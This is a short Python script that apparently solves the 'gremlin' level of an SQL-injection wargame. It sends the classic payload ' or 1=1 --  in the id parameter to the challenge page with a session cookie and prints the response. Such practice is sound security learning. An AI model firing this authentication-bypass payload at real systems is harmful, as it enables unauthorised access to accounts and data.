import requests
from settings import session_id
from bs4_utils import print_html


url = "https://los.rubiya.kr/chall/gremlin_280c5552de8b681110e9287421b834fd.php"
cookies = {'PHPSESSID': session_id}

params = {
    'id': "' or 1=1 -- "
}
response = requests.get(url, params=params, cookies=cookies)
print_html(response.text)
